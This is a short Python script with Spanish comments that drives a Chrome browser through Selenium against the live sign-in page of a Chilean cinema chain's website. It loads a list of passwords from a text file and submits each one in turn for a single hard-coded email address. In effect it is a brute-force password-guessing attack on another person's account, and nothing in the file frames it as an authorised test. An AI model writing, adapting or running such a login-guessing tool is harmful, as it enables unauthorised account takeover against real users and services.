import pandas as pd
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC



#obtener los datos
data = pd.read_csv('./passwords.txt',header=None)

#SObtener usuairos y consrtasenas, solo tomaremos los primero 20
pwd = data.iloc[:,0]
correo = "nix.danthony@ifyourock.com"
driver = webdriver.Chrome("./chromedriver")

driver.get('https://www.cinemark.cl/#signin')
print(pwd)

for index in range(len(pwd)):
    time.sleep(5)
    usuario_name = driver.find_element_by_name("username")
    usuario_pass = driver.find_element_by_name('password')
    ingresar = driver.find_element_by_name('commit')

    usuario_name.send_keys(correo)
    usuario_pass.send_keys(pwd[index])
    time.sleep(1)
    usuario_pass.send_keys(Keys.ENTER)